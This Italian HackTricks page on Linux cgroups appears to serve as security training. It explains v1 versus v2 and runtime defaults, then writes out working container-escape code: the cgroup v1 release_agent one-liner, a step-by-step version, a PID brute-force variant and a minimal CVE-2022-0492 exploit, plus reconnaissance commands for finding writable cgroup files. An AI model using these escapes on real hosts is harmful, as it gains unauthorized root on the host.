# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Panoramica

Linux **control groups** sono il meccanismo del kernel usato per raggruppare i processi per contabilità, limitazione, prioritizzazione e applicazione di policy. Se i namespaces servono principalmente a isolare la vista delle risorse, i cgroups servono principalmente a regolare **quanto** di quelle risorse un insieme di processi può consumare e, in alcuni casi, **quali classi di risorse** possono interagire. I containers si affidano ai cgroups costantemente, anche quando l'utente non li guarda direttamente, perché quasi ogni runtime moderno ha bisogno di dire al kernel "questi processi appartengono a questo workload, e queste sono le regole di risorse che si applicano a loro".

Per questo motivo i container engines collocano un nuovo container nel proprio sottoalbero cgroup. Una volta che l'albero dei processi è lì, il runtime può limitare la memoria, limitare il numero di PIDs, assegnare un peso all'utilizzo della CPU, regolare l'I/O e restringere l'accesso ai dispositivi. In un ambiente di produzione, questo è essenziale sia per la sicurezza multi-tenant sia per una semplice igiene operativa. Un container senza controlli di risorse significativi può esaurire la memoria, sommergere il sistema di processi o monopolizzare CPU e I/O in modi che rendono instabile l'host o i workload vicini.

Dal punto di vista della sicurezza, i cgroups sono importanti in due modi distinti. Primo, limiti di risorse errati o assenti consentono attacchi di denial-of-service semplici. Secondo, alcune funzionalità dei cgroup, specialmente nelle vecchie configurazioni **cgroup v1**, hanno storicamente creato potenti primitive di breakout quando erano scrivibili dall'interno di un container.

## v1 Vs v2

Esistono due principali modelli di cgroup in uso. **cgroup v1** espone multiple gerarchie di controller, e vecchi writeup di exploit spesso ruotano attorno alle semantiche strane e a volte eccessivamente potenti disponibili lì. **cgroup v2** introduce una gerarchia più unificata e un comportamento generalmente più pulito. Le distribuzioni moderne preferiscono sempre più cgroup v2, ma esistono ancora ambienti misti o legacy, il che significa che entrambi i modelli sono rilevanti quando si analizzano sistemi reali.

La differenza è importante perché alcune delle storie di breakout da container più famose, come gli abusi di **`release_agent`** in cgroup v1, sono legate in modo molto specifico al comportamento dei vecchi cgroup. Un lettore che vede un exploit su un blog e poi lo applica ciecamente a un sistema moderno che usa solo cgroup v2 rischia di fraintendere ciò che è effettivamente possibile sul target.

## Ispezione

Il modo più rapido per vedere dove si trova la shell corrente è:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Il file `/proc/self/cgroup` mostra i percorsi cgroup associati al processo corrente. Su un host moderno con cgroup v2, spesso vedrai una voce unificata. Su host più vecchi o ibridi, potresti vedere più percorsi dei controller v1. Una volta conosciuto il percorso, puoi ispezionare i file corrispondenti sotto `/sys/fs/cgroup` per vedere i limiti e l'utilizzo corrente.

Su un host con cgroup v2, i seguenti comandi sono utili:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Questi file rivelano quali controller esistono e quali ones sono delegati ai child cgroups. Questo modello di delega è importante negli ambienti rootless e gestiti da systemd, dove il runtime potrebbe essere in grado di controllare solo il sottoinsieme di funzionalità dei cgroup che la parent hierarchy effettivamente delega.

## Lab

Un modo per osservare cgroups in pratica è eseguire un container con limite di memoria:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Puoi anche provare un container con PID limitato:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
These examples are useful because they help connect the runtime flag to the kernel file interface. The runtime is not enforcing the rule by magic; it is writing the relevant cgroup settings and then letting the kernel enforce them against the process tree.

## Utilizzo del runtime

Docker, Podman, containerd, and CRI-O si basano tutti sui cgroups come parte del normale funzionamento. Le differenze di solito non riguardano se usano i cgroups, ma **quali impostazioni predefinite scelgono**, **come interagiscono con systemd**, **come funziona la delega rootless**, e **quanto della configurazione è controllata a livello di engine rispetto al livello di orchestrazione**.

In Kubernetes, resource requests and limits diventano alla fine configurazioni dei cgroup sul nodo. Il percorso dal Pod YAML all'applicazione del vincolo da parte del kernel passa attraverso il kubelet, il CRI runtime e l'OCI runtime, ma i cgroups restano il meccanismo del kernel che applica finalmente la regola. In ambienti Incus/LXC, i cgroups sono usati intensamente, specialmente perché i system containers spesso espongono un albero di processi più ricco e aspettative operative più simili a una VM.

## Malconfigurazioni e fughe

La classica storia di sicurezza dei cgroup è il meccanismo scrivibile **cgroup v1 `release_agent`**. In quel modello, se un attaccante poteva scrivere nei giusti file del cgroup, abilitare `notify_on_release` e controllare il percorso memorizzato in `release_agent`, il kernel poteva finire per eseguire un percorso scelto dall'attaccante negli initial namespaces on the host quando il cgroup diventava vuoto. Ecco perché le analisi più vecchie pongono tanta attenzione sulla scrivibilità dei controller dei cgroup, sulle opzioni di mount e sulle condizioni di namespace/capability.

Anche quando `release_agent` non è disponibile, gli errori di configurazione dei cgroup contano ancora. Un accesso ai device troppo ampio può rendere i dispositivi dell'host raggiungibili dal container. Limiti mancanti di memoria e PID possono trasformare una semplice esecuzione di codice in un DoS sull'host. Una delega debole dei cgroup in scenari rootless può anche indurre in errore chi difende, facendogli presumere che esista una restrizione quando il runtime non è mai stato effettivamente in grado di applicarla.

### Background di `release_agent`

La tecnica di `release_agent` si applica solo a **cgroup v1**. L'idea di base è che quando l'ultimo processo in un cgroup esce e `notify_on_release=1` è impostato, il kernel esegue il programma il cui percorso è memorizzato in `release_agent`. Quell'esecuzione avviene negli **initial namespaces on the host**, ed è questo che trasforma un `release_agent` scrivibile in una primitive per l'evasione dal container.

Per far funzionare la tecnica, l'attaccante generalmente necessita di:

- una gerarchia **cgroup v1** scrivibile
- la possibilità di creare o usare un cgroup figlio
- la possibilità di impostare `notify_on_release`
- la possibilità di scrivere un percorso in `release_agent`
- un percorso che risolva in un eseguibile dal punto di vista dell'host

### PoC classico

Il PoC storico one-liner è:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Questo PoC scrive un percorso del payload in `release_agent`, scatena il rilascio del cgroup e poi legge il file di output generato sull'host.

### Spiegazione passo-passo

La stessa idea è più facile da comprendere se suddivisa in passaggi.

1. Crea e prepara un cgroup scrivibile:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Identificare l'host path che corrisponde al container filesystem:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Posiziona un payload che sarà visibile dal percorso host:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Scatenare l'esecuzione svuotando il cgroup:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
L'effetto è l'esecuzione sul host del payload con privilegi root sull'host. In un exploit reale, il payload di solito scrive un file di prova, avvia una reverse shell o modifica lo stato dell'host.

### Variante con percorso relativo usando `/proc/<pid>/root`

In alcuni ambienti, il percorso host al filesystem del container non è ovvio o è nascosto dal storage driver. In tal caso il percorso del payload può essere espresso tramite `/proc/<pid>/root/...`, dove `<pid>` è un PID dell'host appartenente a un processo nel container corrente. Questa è la base della variante brute-force a percorso relativo:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Il trucco rilevante qui non è il brute force in sé ma la forma del percorso: `/proc/<pid>/root/...` permette al kernel di risolvere un file all'interno del filesystem del container dalla namespace dell'host, anche quando il percorso diretto dello storage dell'host non è noto a priori.

### CVE-2022-0492 Variante

Nel 2022, CVE-2022-0492 ha mostrato che la scrittura su `release_agent` in cgroup v1 non verificava correttamente `CAP_SYS_ADMIN` nel namespace utente **iniziale**. Questo ha reso la tecnica molto più raggiungibile su kernel vulnerabili perché un processo nel container che poteva montare una gerarchia cgroup poteva scrivere su `release_agent` senza essere già privilegiato nel namespace utente dell'host.

Exploit minimo:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Su un kernel vulnerabile, l'host esegue `/proc/self/exe` con privilegi root dell'host.

Per abusarne praticamente, inizia controllando se l'ambiente espone ancora percorsi cgroup-v1 scrivibili o accesso a device pericolosi:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Se `release_agent` è presente e scrivibile, sei già nel territorio legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Se il percorso cgroup stesso non consente un escape, l'uso pratico successivo è spesso denial of service o reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Questi comandi indicano rapidamente se il carico di lavoro ha margine per effettuare una fork-bomb, consumare memoria in modo aggressivo o abusare di un'interfaccia cgroup obsoleta e scrivibile.

## Controlli

Quando si esamina un target, lo scopo dei controlli cgroup è capire quale modello di cgroup è in uso, se il container vede percorsi dei controller scrivibili e se primitive di breakout obsolete come `release_agent` siano anche rilevanti.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Cosa è interessante qui:

- Se `mount | grep cgroup` mostra **cgroup v1**, i breakout writeups più vecchi diventano più rilevanti.
- Se `release_agent` esiste ed è raggiungibile, vale subito la pena indagare più a fondo.
- Se la gerarchia cgroup visibile è scrivibile e il container ha anche capabilities elevate, l'ambiente merita una revisione molto più approfondita.

Se scopri **cgroup v1**, mount dei controller scrivibili e un container che ha anche capabilities elevate o protezioni seccomp/AppArmor deboli, quella combinazione merita molta attenzione. I cgroups sono spesso trattati come un argomento noioso di gestione delle risorse, ma storicamente hanno fatto parte di alcune delle più istruttive container escape chains proprio perché il confine tra "controllo delle risorse" e "influenza sull'host" non è sempre stato così netto come si pensava.

## Impostazioni predefinite del runtime

| Runtime / platform | Stato predefinito | Comportamento predefinito | Debolezze manuali comuni |
| --- | --- | --- | --- |
| Docker Engine | Abilitato di default | I container vengono posizionati nei cgroups automaticamente; i limiti sulle risorse sono opzionali a meno che non siano impostati con flag | omettendo `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Abilitato di default | `--cgroups=enabled` è il default; i default del cgroup namespace variano in base alla versione di cgroup (`private` su cgroup v2, `host` su alcune configurazioni cgroup v1) | `--cgroups=disabled`, `--cgroupns=host`, accesso ai dispositivi più permissivo, `--privileged` |
| Kubernetes | Abilitato attraverso il runtime per impostazione predefinita | Pods e container vengono posizionati nei cgroups dal runtime del nodo; il controllo granulare delle risorse dipende da `resources.requests` / `resources.limits` | omissione di resource requests/limits, accesso a dispositivi privilegiati, errata configurazione del runtime a livello host |
| containerd / CRI-O | Abilitato di default | i cgroups fanno parte della normale gestione del ciclo di vita | configurazioni dirette del runtime che allentano i controlli sui dispositivi o espongono interfacce legacy scrivibili di cgroup v1 |

La distinzione importante è che l'**esistenza dei cgroup** è di solito predefinita, mentre gli **utili vincoli sulle risorse** sono spesso opzionali a meno di una configurazione esplicita.
{{#include ../../../../banners/hacktricks-training.md}}
